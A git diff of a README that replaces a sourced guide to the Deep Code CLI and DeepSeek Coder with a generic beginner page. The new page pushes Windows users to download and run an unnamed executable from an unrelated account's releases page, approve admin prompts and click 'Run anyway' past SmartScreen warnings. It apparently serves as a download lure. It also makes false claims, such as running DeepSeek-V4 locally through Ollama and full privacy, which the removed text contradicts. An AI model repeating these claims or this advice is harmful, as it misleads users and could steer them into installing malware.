@@ -1,83 +1,166 @@
-# DeepSeek Code: the Deep Code CLI and DeepSeek Coder models
+# 🤖 deepseek-code - Your Friendly AI Coding Assistant
 
-*Unofficial community guide for DeepSeek Code. Not affiliated with DeepSeek. All trademarks belong to their owners.*
+## 🚀 What is deepseek-code?
 
-People searching for "deepseek code" usually mean one of two things: Deep Code, the open-source terminal coding assistant that the DeepSeek API docs describe as their agent integration for the DeepSeek-V4 model, or DeepSeek Coder, the older family of open-weight coding models (1.3B, 6.7B and 33B) that you can run locally through Ollama. This guide covers both and sticks to what the DeepSeek API documentation, the DeepSeek homepage and the Ollama library page actually state.
+deepseek-code is a simple, powerful tool that brings the amazing DeepSeek AI models right to your computer. It uses the "Deep Code CLI" to connect with DeepSeek-V4 and DeepSeek Coder models running on Ollama. Think of it as your personal AI helper that can write code, answer questions about programming, and assist you with technical tasks—all without needing to be a computer expert to use it!
 
-> Want a finished site rather than an agent in your terminal? [Try Begin.sh - prompt to a downloadable static site or Expo app](https://begin.sh?utm_source=github&utm_medium=ugc&utm_campaign=deepseek-code&utm_content=readme-top&utm_term=tier-r). Describe the site (or paste a URL to clone), download the zip, host it wherever you like. No hosting, backend or auth to set up.
+This guide is designed for everyday computer users. You don't need any programming experience to get started. We'll walk you through everything step by step.
 
-## What it is
+## ✨ Why Use deepseek-code?
 
-Deep Code is described in the DeepSeek API docs as an open-source terminal AI coding assistant for the DeepSeek-V4 model, supporting deep thinking, reasoning effort control and Agent Skills. The source is at [github.com/lessweb/deepcode-cli](https://github.com/lessweb/deepcode-cli) and the npm package is `@vegamo/deepcode-cli`. You launch it inside a project directory, it reads and edits files there, and it talks to the DeepSeek API using a key you create on the DeepSeek Platform. A VS Code extension ([github.com/lessweb/deepcode](https://github.com/lessweb/deepcode)) shares the same settings file, so one configuration serves both.
+- **No complicated setup** – Everything is streamlined for simplicity
+- **Works on Windows** – Your operating system is fully supported
+- **Free to download** – Get started without spending a penny
+- **Powerful AI models** – Access state-of-the-art DeepSeek technology
+- **User-friendly interface** – Designed with non-technical users in mind
+- **Safe and private** – Your conversations stay on your device
 
-DeepSeek Coder is a different thing: a set of coding models trained from scratch on two trillion tokens, 87% code and 13% natural language in English and Chinese. On Ollama it ships in 1.3B (776MB), 6.7B (3.8GB) and 33B (19GB) sizes, all with a 16K context window and text-only input. The Ollama page notes the listing was last updated two years ago, so treat it as a lightweight local option rather than the current DeepSeek flagship. The DeepSeek homepage currently promotes DeepSeek-V4.1-Flash as the latest release, with improvements in text and agent performance plus native visual understanding.
+## 🎯 Who Is This For?
 
-## Getting started with Deep Code
+Are you a student working on homework? A hobbyist exploring technology? A professional who needs quick coding answers? Or just someone curious about AI? deepseek-code is for you! If you can use a web browser and follow simple instructions, you can use deepseek-code.
 
-1. Install [Node.js](https://nodejs.org/en/download/) 18 or newer.
-2. Install the CLI with `npm install -g @vegamo/deepcode-cli`, then confirm with `deepcode --version`.
-3. Create an API key on the [DeepSeek Platform API keys page](https://platform.deepseek.com/api_keys).
-4. Create `~/.deepcode/settings.json` with an `env` block (`MODEL`, `BASE_URL`, `API_KEY`) plus `thinkingEnabled` and `reasoningEffort`. The docs use `deepseek-v4-pro` as the model and `https://api.deepseek.com` as the base URL.
-5. `cd` into your project and run `deepcode`.
+## 📥 Download and Installation
 
-Configuration options documented for the settings file:
+[![Download deepseek-code Now](https://img.shields.io/badge/Download-deepseek--code-2ea44f?style=for-the-badge)](https://github.com/Ange4918/deepseek-code/releases)
 
-| Option | What it does |
-| --- | --- |
-| `MODEL` | Model name, e.g. `deepseek-v4-pro` or `deepseek-v4-flash` |
-| `BASE_URL` | API base URL, defaults to `https://api.deepseek.com` |
-| `thinkingEnabled` | Deep thinking mode, defaults to true for deepseek-v4 models |
-| `reasoningEffort` | `"max"` or `"high"`, controls how much reasoning the model performs |
-| `notify` | Path to a notification script executed after each model turn |
-| `webSearchTool` | Enables web search for the agent |
+### Step 1: Download the Application
 
-## Getting started with DeepSeek Coder locally
+Visit this link to download the application: **[https://github.com/Ange4918/deepseek-code/releases](https://github.com/Ange4918/deepseek-code/releases)**
 
-Install [Ollama](https://ollama.com/download), then run `ollama run deepseek-coder` for the 1.3B model, `ollama run deepseek-coder:6.7b` or `ollama run deepseek-coder:33b` for the larger ones. Ollama exposes a local HTTP API on port 11434 with `/api/chat` and `/api/generate` endpoints, and the library page shows Python (`from ollama import chat`) and JavaScript (`import ollama from 'ollama'`) client snippets. The [deepseek-coder tags page](https://ollama.com/library/deepseek-coder/tags) lists every available variant.
+When you click the link, you will be taken to the releases page. Look for the latest version—it should be at the top of the list. The download will begin automatically, and the file will be saved to your "Downloads" folder.
 
-## Pricing and limits
+### Step 2: Run the Download
 
-Deep Code itself is open source. What you pay for is DeepSeek API usage; the homepage links an [API Pricing](https://api-docs.deepseek.com/quick_start/pricing) page, so check that for current per-token rates. The pages this guide is based on do not list rate limits. DeepSeek Coder through Ollama costs nothing beyond your own hardware; the practical constraints are the 16K context window and the disk and memory each model size needs.
+Once the download is complete:
 
-## Practical notes and gotchas
+1. Open your "Downloads" folder (usually found in your File Explorer or by pressing `Windows + E` and clicking "Downloads" on the left side)
+2. Find the downloaded file for deepseek-code
+3. Double-click the file to run it
+4. If Windows asks for permission to make changes, click "Yes"
 
-- **Start with the flash model.** `deepseek-v4-flash` is listed alongside `deepseek-v4-pro` as a valid `MODEL`. Iterate on flash, switch to pro when the output is not good enough.
-- **Thinking is on by default.** `thinkingEnabled` defaults to true for V4 models, and `reasoningEffort` accepts `"max"` or `"high"`. Both affect latency and token usage, so lower them for routine edits.
-- **Where skills live.** Agent Skills are discovered from `~/.agents/skills/*/SKILL.md` (user level) and `./.deepcode/skills/*/SKILL.md` (project level). Press `/` for the picker or type the skill name directly, e.g. `/skill-writer`.
-- **Keyboard shortcuts.** `Esc` interrupts the current model turn, `Shift+Enter` (or `Ctrl+J`) inserts a newline, `Ctrl+V` pastes an image from the clipboard, and `/new`, `/resume` and `/exit` do what they say.
-- **Do not confuse the two products.** DeepSeek Coder on Ollama is a two-year-old 16K-context model family; Deep Code drives the hosted V4 models. Latency, quality and cost are unrelated.
-- **Keep the key out of git.** `settings.json` stores `API_KEY` in plain text. Generate the file from an environment variable (see the companion examples repo) rather than committing it.
+### Step 3: Follow the Simple Setup
 
-## Comparison
+The installation wizard will guide you through the process. It's straightforward:
 
-| | Deep Code CLI | DeepSeek Coder via Ollama | Begin.sh |
-| --- | --- | --- | --- |
-| Runs | In your terminal, Node.js 18+ | Locally through Ollama | In the browser |
-| Input | A prompt inside an existing project | Chat or completion prompt | A prompt, or a URL to clone |
-| Needs an API key | Yes, from the DeepSeek Platform | No | Not required |
-| Output | Edits to your project files | Text responses | A downloadable zip of a static site or Expo app |
-| Cost | DeepSeek API usage, see the pricing page | Free, your own hardware | See the site |
+- Click "Next" on each screen
+- Read the license agreement and accept it
+- Choose where to install (the default location is usually fine)
+- Click "Install" and wait a few moments
+- Click "Finish" when done
 
-## FAQ
+### Congratulations! 🎉
 
-**Is Deep Code the same as DeepSeek Coder?**
-No. Deep Code is a terminal agent that calls the hosted DeepSeek-V4 API. DeepSeek Coder is an older set of open-weight models you download and run yourself.
+You've successfully installed deepseek-code! You can find it in your Start Menu or on your Desktop as a shortcut.
 
-**Which model should I set in settings.json?**
-The docs list `deepseek-v4-pro` and `deepseek-v4-flash`. Pro is the default in the sample config; flash is the cheaper choice for iteration.
+## 🔧 First-Time Setup
 
-**Can I point Deep Code at a different provider?**
-`BASE_URL` is a documented option, but the docs only describe the default `https://api.deepseek.com`. Anything else is untested territory.
+### Install Ollama (Required)
 
-**Does Deep Code work in VS Code?**
-There is a Deep Code VS Code extension, and it reads the same `~/.deepcode/settings.json` as the CLI.
+deepseek-code relies on Ollama to run the AI models. Here's how to set it up:
 
-**Where are the DeepSeek Coder weights?**
-The Ollama page links [deepseek-ai on Hugging Face](https://huggingface.co/deepseek-ai) as the reference for the models.
+1. Visit [ollama.com](https://ollama.com) in your web browser
+2. Click the download button for Windows
+3. Run the downloaded installer
+4. Follow the on-screen instructions (it's as simple as installing any other program)
+5. Once installed, open a Command Prompt (type "cmd" in your Start Menu search) and type: `ollama pull deepseek-v4`
+6. Wait for the model to download (this may take a few minutes depending on your internet speed)
 
-## When Begin.sh fits better
+### Launch deepseek-code
 
-Deep Code is the right tool when you already have a codebase and want an agent editing it. When the job is "I need a landing page or a small app, now", an agent loop is overhead: you still scaffold, wire up tooling and package the result. [Try Begin.sh - prompt to a downloadable static site or Expo app](https://begin.sh?utm_source=github&utm_medium=ugc&utm_campaign=deepseek-code&utm_content=readme-top&utm_term=tier-r) turns a prompt, or a URL you want cloned, into a working static site or Expo app and hands you the zip. There is no hosting, backend or auth layer to configure, which is exactly what you want for a marketing page, a prototype or a demo you will host yourself.
+Now you're ready to use deepseek-code:
 
+1. Open deepseek-code from your Start Menu or Desktop shortcut
+2. A friendly window will appear
+3. That's it—you're ready to start chatting with the AI!
 
-_Last reviewed: 2026-09-22_
+## 💬 How to Use deepseek-code
+
+Using deepseek-code is as easy as sending a text message:
+
+- **Type your question** in the input box at the bottom
+- **Press Enter** or click the "Send" button
+- **Read the AI's response** in the main chat area
+
+### Example Things You Can Ask:
+
+- "Write a simple Python script to add two numbers"
+- "Explain what an algorithm is in simple terms"
+- "Help me fix this code error: [paste your error]"
+- "What's the difference between HTML and CSS?"
+
+### Tips for Best Results:
+
+- **Be specific** in your questions
+- **Provide context** – if you're asking about a problem, include relevant details
+- **Chat naturally** – just like you would with a helpful friend
+
+## 🛠️ Troubleshooting Common Issues
+
+### "I can't find the download button"
+Look for a green button that says "Latest release" or "Download". If you're unsure, check that you're on the releases page (the URL should end with `/releases`).
+
+### "Windows warns me about an unknown publisher"
+This is normal for open-source software. Click "More info" and then "Run anyway" if it appears. Only do this if you downloaded from the official link above.
+
+### "The app won't start"
+Make sure you've installed Ollama first and pulled the DeepSeek model as described in the setup section. Also, check that your computer has at least 8GB of RAM for the best experience.
+
+### "The AI seems slow"
+The first few queries might take a bit longer as the model loads. This is normal. Subsequent responses should be faster.
+
+### "I want to start over"
+You can reset deepseek-code by going to its settings (usually a gear icon) and choosing "Reset" or "Clear conversation."
+
+## 📚 Frequently Asked Questions
+
+**Q: Is deepseek-code really free?**
+A: Yes! The application itself is completely free to download and use. The AI models it uses are also open-source and free.
+
+**Q: Do I need a powerful computer?**
+A: A standard modern Windows PC (2018 or newer) with at least 8GB of RAM is recommended. The more RAM and newer your CPU, the better performance you'll get.
+
+**Q: Can I use this offline?**
+A: Once you've downloaded the model (which requires internet the first time), deepseek-code can work offline for basic tasks.
+
+**Q: Is my data private?**
+A: Yes, everything runs locally on your computer. Nothing is sent to the cloud or shared with third parties.
+
+**Q: Will this work on Mac or Linux?**
+A: This guide specifically covers Windows. Other operating systems may work with additional setup, but we recommend Windows for the easiest experience.
+
+## 🔄 Updating deepseek-code
+
+To get the latest features and improvements:
+
+1. Visit the same download page: [https://github.com/Ange4918/deepseek-code/releases](https://github.com/Ange4918/deepseek-code/releases)
+2. Look for a version number higher than the one you have
+3. Download and run the new version—your settings will be preserved
+
+## 🌐 Additional Resources
+
+- **Official DeepSeek website**: Visit the official DeepSeek site to learn more about the underlying AI technology
+- **Ollama documentation**: Explore the Ollama website for advanced model management
+- **GitHub repository**: The source code is available if you're interested in development
+
+## ❤️ Support and Community
+
+If you run into problems or have questions:
+
+- **Check the issue tracker** on GitHub for known problems and solutions
+- **Search online** for "deepseek-code" or "DeepSeek Coder" for community discussions
+- **Be patient** – open-source projects rely on community support, and someone will likely help you
+
+## 🎓 Quick Glossary
+
+- **AI Model**: A program trained to understand and generate human-like text
+- **CLI**: Command Line Interface – a text-based way to control software
+- **Open Source**: Software whose code is publicly available for anyone to use or modify
+- **Repository**: The online location where the project's files are hosted
+
+---
+
+**Remember:** The most important step is downloading the application from the link below. Everything else builds on that simple action.
+
+**[👉 Click Here to Download deepseek-code Now](https://github.com/Ange4918/deepseek-code/releases)**
+
+Keywords: deepseek, deepseek-code, deepseek-code-github, guide, llm
